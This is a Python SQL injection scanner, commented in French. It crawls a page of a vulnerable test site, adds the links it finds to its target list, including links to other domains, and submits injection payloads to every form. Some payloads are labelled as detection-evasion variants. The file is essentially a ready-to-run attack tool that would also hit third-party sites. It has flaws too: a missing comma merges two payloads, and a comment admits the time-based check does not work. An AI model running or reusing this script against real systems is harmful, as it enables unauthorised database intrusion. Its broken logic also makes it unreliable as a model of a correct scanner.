import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time

TARGET_URL = "http://testphp.vulnweb.com"  # URL cible
TARGET_URLS = []

# Payloads SQLi classiques et time-based
SQLI_PAYLOADS = [
    "'", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'--'", "' UNION SELECT null, version()--",
    "' AND SLEEP(7)--", "' OR SLEEP(5)--"
    "' OR IF(1=1, SLEEP(5), 0)--",  # Bypass avec IF
    "' OR IF(1=1, BENCHMARK(1000000,MD5(1)), 0)--",  # Bypass avec BENCHMARK
    "' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END--",  # Bypass avec CASE
    "' OR CHAR(83,76,69,69,80,40,53,41)--",  # Encode "SLEEP(5)"
    "' OR CONCAT('SLE','EP(5)')--"  # Séparer SLEEP pour éviter la détection
]

def get_external_links(url):
    """🔗 Récupère tous les liens externes et PHP d'une page"""
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    base_domain = urlparse(url).netloc
    external_links = set()

    for link in soup.find_all("a", href=True):
        href = link["href"]
        full_url = urljoin(url, href)
        parsed_url = urlparse(full_url)

        # Inclure les liens PHP même s'ils sont relatifs
        if parsed_url.path.endswith(".php") or (parsed_url.netloc and parsed_url.netloc != base_domain):
            external_links.add(full_url)

    return external_links


def find_forms(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    forms = soup.find_all('form')
    return forms

def get_form_details(forms):
    form_details = []
    for form in forms:
        details = {"action": form.get("action"), "method": form.get("method", "get").lower(), "inputs": []}
        for input_tag in form.find_all("input"):
            details["inputs"].append({"name": input_tag.get("name"), "type": input_tag.get("type", "text")})
        form_details.append(details)
    return form_details

def get_unique_forms(forms):
    unique_forms = set()
    filtered_forms = []

    for form in forms:
        form_signature = (
            form.get("action"), 
            form.get("method", "get").lower(), 
            tuple((input_tag.get("name"), input_tag.get("type", "text")) for input_tag in form.find_all("input"))
        )

        if form_signature not in unique_forms:
            unique_forms.add(form_signature)
            filtered_forms.append(form)
    
    return filtered_forms


def test_sqli(url, form_details):
    print(f"\n[🔍] Test d'injection SQL sur : {url}")
    
    for payload in SQLI_PAYLOADS:
        data = {}

        for input_tag in form_details["inputs"]:
            if input_tag["type"] in ["text", "password"]:
                data[input_tag["name"]] = payload
            else:
                data[input_tag["name"]] = "test"

        action_url = urljoin(url, form_details["action"])
        method = form_details["method"]

        # Mesure le temps pour détecter une SQLi blind
        start_time = time.time()
        response = requests.post(action_url, data=data) if method == "post" else requests.get(action_url, params=data)
        elapsed_time = time.time() - start_time

        # Détection des erreurs SQL classiques
        error_signatures = ["SQL syntax", "mysql_fetch", "You have an error in your SQL syntax", "Warning: mysql"]
        if any(error in response.text for error in error_signatures):
            print(f"[🔥] Injection SQL détectée avec payload : {payload}")

        # Détection Time-Based Blind SQLi ----> pas vrmt fonctionnel
        if "SLEEP(5)" in payload and elapsed_time > 4:
            print(f"[⏳] Injection SQL Blind détectée avec payload : {payload} (temps : {elapsed_time:.2f}s)")

def lancer_attaque_sqli():
    for url in TARGET_URLS:
        forms = get_unique_forms(find_forms(url))
        if not forms:
            print(f"[-] Aucun formulaire trouvé sur {url}")
            continue
        else : print(f"[+] Trouvé {len(forms)} formulaire(s) sur {url}")

        form_details_list = get_form_details(forms)
        for form_details in form_details_list:
            test_sqli(url, form_details)


external_links = get_external_links(TARGET_URL)

if external_links:
    print("\n[🔗] Liens externes trouvés :")
    for link in external_links:
        print(f"  ➡️ {link}")
else:
    print("[❌] Aucun lien externe trouvé. Vérifie que la page en contient !")

TARGET_URLS.extend(external_links)
lancer_attaque_sqli()
